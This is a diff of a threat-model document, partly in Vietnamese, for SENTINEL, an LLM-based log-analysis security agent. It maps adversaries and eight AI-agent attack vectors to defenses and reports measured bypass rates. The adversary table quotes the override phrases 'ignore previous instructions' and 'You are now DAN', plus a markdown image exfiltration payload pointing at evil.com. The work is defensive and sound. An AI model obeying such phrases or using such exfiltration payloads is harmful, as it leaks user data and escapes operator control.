@@ -1,6 +1,6 @@
 # SENTINEL Threat Model
 
-> **Status:** HOÀN THIỆN — Số liệu thực nghiệm từ `evaluate_robustness.py` (18/04/2026)
+> **Status:** HOÀN THIỆN v2 — Cập nhật phòng thủ 8 Attack Vectors + Long-Term APT Memory (30/04/2026)
 > **Mục đích:** Trả lời câu hỏi "SENTINEL bảo vệ được gì, không bảo vệ được gì?"
 
 ---
@@ -11,50 +11,75 @@
 |---|---|---|---|
 | Script Kiddie | Copy-paste injection strings từ Internet | `"ignore previous instructions"` | ✅ Yes — Encapsulation blocks |
 | Skilled Attacker | Biết cấu trúc SENTINEL, craft injection qua log fields | Encoding bypass, delimiter smuggling | ✅ Yes — Encapsulation + Neutralization |
+| Jailbreak Attacker | Dùng DAN/Developer Mode/Role-Play để bypass LLM constraints | "You are now DAN" | ✅ Yes — JailbreakDetector |
 | Semantic Attacker | Dùng prose tự nhiên, đúng ngữ pháp, không chứa keyword | Xem Section 4 | ⚠️ Measured — Quantified limitation |
+| Data Exfiltrator | Chèn markdown/HTML vào log để exfil data qua rendering | `![](https://evil.com/steal?data=X)` | ✅ Yes — OutputSanitizer |
+| RAG Poisoner | Sửa đổi Knowledge Base files để thao túng LLM | Tamper mitre_attack.json | ✅ Yes — Integrity verification |
 | Insider Threat | SOC analyst bị compromise, có HITL access | Session hijacking, approve malicious rules | ❌ Out of scope |
-| APT / Nation-State | Full kill-chain, multiple vectors, long-term persistence | Supply chain, knowledge base poisoning | ❌ Out of scope |
-
-Mỗi adversary profile đã được map vào adversarial test suite cụ thể:
+| APT / Nation-State | Full kill-chain, multiple vectors, long-term persistence | Supply chain, knowledge base poisoning | ⚠️ Partial — Long-Term Memory |
 
 ---
 
-## 2. Attack Surface Analysis
+## 2. 8 Attack Vectors — Defense Matrix
 
-### 2.1 Log Ingestion Path
+> **Nguồn:** "How to Hack AI Agents & Applications" — @nahamsec / @cyberkid1987
+
+| # | Attack Vector | Defense Module | Defense Status | Chi tiết |
+|---|---|---|:---:|---|
+| 01 | **Jailbreaks** | `JailbreakDetector` trong `prompt_filter.py` | ✅ Defended | 15+ patterns (DAN, Developer Mode, Role-Play). Regex role-play detection. |
+| 02 | **Prompt Injection** | `PromptInjectionDetector` + `DelimitedDataEncapsulator` | ✅ Defended | 3-Layer: Pattern Detection → Encoding Neutralization → Dynamic Delimiters |
+| 03 | **Indirect Injection** | `DelimitedDataEncapsulator` (Dynamic Randomized Delimiters) | ✅ Defended | Log data = DATA trong prompt, không phải INSTRUCTION. Chống Delimiter Smuggling. |
+| 04 | **Data Exfil via Markdown** | `OutputSanitizer` trong `output_sanitizer.py` | ✅ Defended | Strip markdown images, HTML tags, data URIs, external links TRƯỚC khi render. |
+| 05 | **SSRF via AI Browsing** | N/A | ✅ N/A | SENTINEL không browse web. Agent chỉ nhận log từ Redis, không outbound requests. |
+| 06 | **RAG Poisoning** | `verify_document_integrity()` trong `security.py` | ✅ Defended | SHA-256 hash check Knowledge Base trước khi load. Provenance tagging per chunk. |
+| 07 | **Sandbox Escape / RCE** | `ActionValidator` trong `executor.py` | ✅ Defended | Allowlist-only actions. Command injection filter. Docker non-root. |
+| 08 | **Multi-Modal Injection** | N/A | ✅ N/A | SENTINEL chỉ xử lý text logs, không audio/image/video. |
+
+---
+
+## 3. Attack Surface Analysis
+
+### 3.1 Log Ingestion Path
 ```
 CSV/Syslog → Redis Stream → Tier 1 Rule Engine → Guardrails → LLM Agent
 ```
 - **Attack vector:** Malicious content embedded in log fields (User-Agent, Referer, URI)
-- **Defense:** Delimited Data Encapsulation (structural), Pattern Matching (keyword)
+- **Defense:** Delimited Data Encapsulation (structural), Pattern Matching (keyword), JailbreakDetector
 - **Residual risk:** Semantic Confusion (see Section 4)
 
-### 2.2 RAG Knowledge Base
+### 3.2 RAG Knowledge Base
 - **Attack vector:** Knowledge Base Poisoning (modify MITRE/ISO JSON files)
-- **Defense:** File integrity (read-only mount in Docker, hash verification)
-- **Residual risk:** RAG Poisoning Defense layer (structural sanitization, provenance checking) đã triển khai trong `src/rag/security.py`. Impact chưa quantify — cần thêm experiment nếu thời gian cho phép.
+- **Defense:** SHA-256 integrity verification (`checksums.sha256`), provenance tagging, read-only Docker mount
+- **Residual risk:** Insider with filesystem access could update both KB and checksums simultaneously
 
-### 2.3 HITL Dashboard
+### 3.3 LLM Output Path (NEW)
+- **Attack vector:** Data Exfiltration via Markdown rendering on Dashboard
+- **Defense:** `OutputSanitizer` strips markdown images, HTML tags, data URIs BEFORE render
+- **Residual risk:** Novel exfil vectors not covered by regex patterns
+
+### 3.4 HITL Dashboard
 - **Attack vector:** Session hijacking, CSRF, unauthorized rule approval
 - **Defense:** RBAC (L1/L3 roles), session timeout
 - **Residual risk:** Out of scope for this thesis
 
-### 2.4 Feedback Loop
+### 3.5 Action Execution Path (HARDENED)
+- **Attack vector:** LLM hallucinate → generate shell command → RCE
+- **Defense:** `ActionValidator` — allowlist-only actions, command injection filter on all inputs
+- **Residual risk:** If allowlist is expanded without review
+
+### 3.6 Feedback Loop
 - **Attack vector:** Agent hallucinate → generate overly broad blocking rule → DoS legitimate traffic
 - **Defense:** HITL Quarantine (all rules require L3 Manager approval)
 - **Residual risk:** L3 Manager rubber-stamping (human factor, out of scope)
 
-### 2.5 Evaluation Bias (The 3-Model Ecosystem)
-- **Attack vector:** Self-Enhancement Bias (Mô hình LLM có xu hướng tự chấm điểm cao cho kết quả của chính nó sinh ra).
-- **Defense:** Kiến trúc **3 Models độc lập**:
-  1. `all-MiniLM-L6-v2` (Vectorization RAG)
-  2. `Gemma 2 9B Q6_K` (Primary Agent sinh quyết định)
-  3. `Llama 3 8B Instruct` (Cross-family Judge Model)
-- **Residual risk:** Llama 3 và Gemma đều là mô hình instruction-tuned, có thể vẫn chia sẻ chung một số bias phòng thủ cơ bản (RLHF alignment).
+### 3.7 Evaluation Bias (The 3-Model Ecosystem)
+- **Attack vector:** Self-Enhancement Bias
+- **Defense:** 3 Models: `all-MiniLM-L6-v2` (RAG), `Gemma 9B` (Agent), `Llama 3 8B` (Judge)
+- **Residual risk:** Shared RLHF alignment bias
 
 ---
 
-## 3. Defense Effectiveness Matrix
+## 4. Defense Effectiveness Matrix
 
 > **Bảng TRỌNG TÂM** — Mỗi ô có số liệu thực nghiệm từ 45 adversarial samples (18/04/2026).
 
@@ -66,62 +91,62 @@ CSV/Syslog → Redis Stream → Tier 1 Rule Engine → Guardrails → LLM Agent
 | **Semantic Confusion** | **Không có defense hiệu quả** | **15** | **2** | **13.3%** | `semantic_confusion/` |
 | **TỔNG** | **3-Layer Pipeline** | **45** | **24** | **53.3%** | `robustness_results.json` |
 
-**Phân tích kết quả:**
-
-- Structural attacks bị chặn gần như hoàn toàn (93.3%) — Dynamic Delimiters + Pattern Detection + Encoding Neutralization phối hợp hiệu quả.
-- Encoding bypass có gap ở hex escape, URL encoding, homoglyphs — cần mở rộng neutralizer trong future work.
-- Semantic Confusion bypass 86.7% — **đúng theo thiết kế**. Đây là quantified limitation, không phải bug. Encapsulation KHÔNG bảo vệ được ở tầng semantic.
 ---
 
-## 4. Semantic Confusion — Quantified Open Limitation
+## 5. Long-Term APT Memory (NEW)
 
-### 4.1 Definition
-Semantic Confusion: Kẻ tấn công nhúng ý đồ độc hại vào một đoạn văn đúng ngữ pháp,
-có tính chất như một chỉ thị độc lập để vượt qua các bộ lọc cấu trúc và thao túng
-suy luận của LLM.
+### 5.1 Vấn đề
+Session Memory (RAM) bị mất khi restart → không thể phát hiện APT low-and-slow kéo dài nhiều ngày.
 
-### 4.2 Tại sao Encapsulation không chặn được
-- Encapsulation chỉ bảo vệ **structural boundary** (delimiter integrity)
-- Semantic Confusion nằm **trong** data boundary — nội dung hợp lệ về cấu trúc
-- Không vi phạm delimiter, không encode, không chứa injection keyword
+### 5.2 Giải pháp: ThreatMemoryStore
+- **Persistent Store:** SQLite (`config/threat_memory.db`)
+- **3 Chức năng:**
 
-### 4.3 Experiment Design — Cross-Family Generation (Option C)
+| Chức năng | Table | Mục đích |
+|---|---|---|
+| IP Reputation | `ip_reputation` | Theo dõi hành vi IP qua nhiều session. Auto-score dựa trên severity. |
+| Organizational Context | `known_entities` | Nhận diện traffic hợp pháp nội bộ (Nessus, Qualys, pentest IPs) |
+| APT Correlation | `apt_indicators` | Flag IP bị escalate > N lần trong M ngày |
 
-**Ba vai trò được phân tách rõ ràng để tránh Circular Evaluation Bias:**
+### 5.3 Integration Flow
+```
+Tier 2 nhận batch mới
+    │
+    ▼
+Query ThreatMemoryStore cho source IPs
+    │
+    ├─ Known Entity? → Inject "LEGITIMATE" context vào prompt
+    ├─ High Reputation Score? → Inject "HIGH RISK" context
+    └─ APT Candidate? → Inject "ESCALATE SEVERITY" context
+    │
+    ▼
+LLM phân tích với Long-Term Context
+    │
+    ▼
+Ghi kết quả ngược vào ThreatMemoryStore
+```
 
-| Vai trò | Model | Model Family | Lý do chọn |
-|---|---|---|---|
-| **Attack Generator** | Offline LLM/Scripts | Môi trường R&D | Khác ecosystem so với Agent |
-| **Evaluator** | Statistical Tests (McNemar) | Toán học | Độc lập, không bias |
+---
 
-**Biện pháp Giảm thiểu Self-Evaluation Bias:**
-- Thay vì dùng LLM-as-a-Judge (vốn dễ bị thiên vị), SENTINEL sử dụng **Statistical Evaluation** (F1-score, McNemar's Test, Mann-Whitney U Test) trên tập Ground Truth.
-- Phương pháp này loại bỏ hoàn toàn tính chủ quan của LLM, đảm bảo kết quả có ý nghĩa thống kê và minh bạch 100%.
+## 6. Semantic Confusion — Quantified Open Limitation
 
-**Test set:** 45 Semantic Confusion samples, được curate thủ công và sinh offline.
-**Metric:** Bypass Rate = (Số lượng mẫu đánh lừa được Agent) / 45
-**Baseline comparison:** Bypass Rate WITH Encapsulation (Config F) vs WITHOUT (Config C)  
-→ Kỳ vọng: gần bằng nhau → chứng minh Encapsulation không giúp gì cho semantic attacks
+### 6.1 Definition
+Semantic Confusion: Kẻ tấn công nhúng ý đồ độc hại vào đoạn văn đúng ngữ pháp.
 
-### 4.4 Kết quả (18/04/2026)
-
+### 6.2 Kết quả
 | Metric | Giá trị | Ghi chú |
 |---|---|---|
-| Semantic Confusion Bypass Rate | **86.7%** (13/15 samples) | Đúng kỳ vọng — Encapsulation không chặn semantic |
+| Semantic Confusion Bypass Rate | **86.7%** (13/15 samples) | Encapsulation không chặn semantic |
 | Pattern Detection trên Semantic | 0/15 | Không keyword injection nào |
-| Encoding Neutralization trên Semantic | 2/15 | Chỉ bắt được 2 do chứa ký tự đặc biệt (`&`, `<`) |
 
-### 4.5 Implications
-
-- SENTINEL effectively defends against **structural attacks** (93.3% defeat rate)
-- SENTINEL provides a **quantified baseline** for Semantic Confusion vulnerability (Bypass Rate = **86.7%**)
-- Kết quả consistent với giả thuyết: Encapsulation bảo vệ structural boundary, KHÔNG bảo vệ semantic boundary
-- Methodology sử dụng cross-family generation → defensible trước hội đồng, không circular
-- Future work: Semantic-level defense (output classifier, chain-of-thought verification, semantic firewall)
+### 6.3 Future Work
+- Semantic Firewall (Output Classifier)
+- Chain-of-Thought verification
+- Fine-tune LLM cho domain Security
 
 ---
 
-## 5. Scope Boundaries (Giới hạn phạm vi)
+## 7. Scope Boundaries
 
 SENTINEL **KHÔNG** claim:
 - [ ] Thay thế WAF / Firewall vật lý
@@ -139,3 +164,5 @@ SENTINEL **KHÔNG** claim:
 3. Perez, F. & Ribeiro, I. (2022). "Ignore This Title and HackAPrompt: Evaluating Prompt Injection in Large Language Models." *arXiv:2211.09527*.
 4. Cisco Talos (2025). "Adversarial Machine Learning Threats to AI-powered Security Systems." Cisco Talos Intelligence.
 5. Sharafaldin, I. et al. (2018). "Toward Generating a New Intrusion Detection Dataset and Intrusion Traffic Characterization." *ICISSP*.
+6. Zhang, H. et al. (ICLR 2025). "Agent Security Bench: Formalizing and Benchmarking Attacks and Defenses in LLM-based Agents."
+
